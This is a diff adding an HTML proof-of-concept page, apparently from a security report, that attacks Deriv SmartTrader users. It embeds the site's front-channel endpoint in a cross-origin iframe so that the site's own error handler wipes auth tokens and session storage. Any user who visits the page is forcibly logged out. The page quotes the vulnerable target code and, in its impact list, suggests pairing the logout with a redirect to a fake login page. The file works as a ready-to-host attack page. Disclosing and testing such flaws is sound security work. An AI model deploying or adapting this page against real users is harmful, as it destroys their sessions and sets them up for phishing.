@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>D-32 PoC: Session Destruction via front-channel iframe</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+        h1 { color: #ff6b6b; }
+        .status { padding: 10px; margin: 10px 0; border-left: 3px solid #4ecdc4; background: #16213e; }
+        .danger { border-left-color: #ff6b6b; }
+        pre { background: #0f3460; padding: 10px; overflow-x: auto; }
+        iframe { border: 1px solid #333; }
+    </style>
+</head>
+<body>
+    <h1>D-32: Deriv Session Destruction PoC</h1>
+    <p>This page demonstrates how an attacker can destroy a victim's Deriv SmartTrader session
+    by embedding front-channel.html in a cross-origin iframe.</p>
+
+    <div class="status" id="status">Status: Initializing...</div>
+
+    <h2>Attack Mechanism</h2>
+    <p>The front-channel.html page on dsmarttrader.deriv.com checks if it's same-origin with its parent.
+    When loaded cross-origin, the check throws an error, triggering localStorage/sessionStorage cleanup.</p>
+
+    <pre>
+// From dsmarttrader.deriv.com/front-channel
+try {
+    let isSameOrigin = top.location.hostname === self.location.hostname;
+} catch (err) {
+    localStorage.removeItem("client.accounts");       // Auth tokens
+    sessionStorage.removeItem("active_loginid");       // Active session
+    localStorage.removeItem("active_loginid");         // Active session
+    sessionStorage.removeItem("_elevaddon-6app");      // Support widget
+    sessionStorage.removeItem("_elevaddon-6create");   // Support widget
+    localStorage.removeItem("ws_cache");               // WebSocket cache
+}
+    </pre>
+
+    <h2>Payload Delivery</h2>
+    <p>Loading the iframe now...</p>
+
+    <iframe id="attack-frame" width="400" height="100"
+            src="https://dsmarttrader.deriv.com/front-channel"
+            sandbox="allow-scripts allow-same-origin">
+    </iframe>
+
+    <div class="status danger" id="result">
+        Result: If the victim was logged into SmartTrader, their session data has been wiped.
+        They will be logged out on next page load.
+    </div>
+
+    <h2>Impact</h2>
+    <ul>
+        <li>Any website can embed this iframe to forcibly log out Deriv SmartTrader users</li>
+        <li>No user interaction required beyond visiting the attacker's page</li>
+        <li>Destroys authentication tokens (client.accounts) and active session (active_loginid)</li>
+        <li>Can be combined with phishing: destroy session → redirect to fake login page</li>
+    </ul>
+
+    <script>
+        const iframe = document.getElementById('attack-frame');
+        const status = document.getElementById('status');
+
+        iframe.onload = function() {
+            status.textContent = 'Status: front-channel iframe loaded. Session destruction triggered on dsmarttrader.deriv.com origin.';
+            status.classList.add('danger');
+        };
+
+        iframe.onerror = function() {
+            status.textContent = 'Status: iframe failed to load (may be blocked by X-Frame-Options).';
+        };
+
+        setTimeout(() => {
+            if (!status.classList.contains('danger')) {
+                status.textContent = 'Status: Waiting for iframe to load...';
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
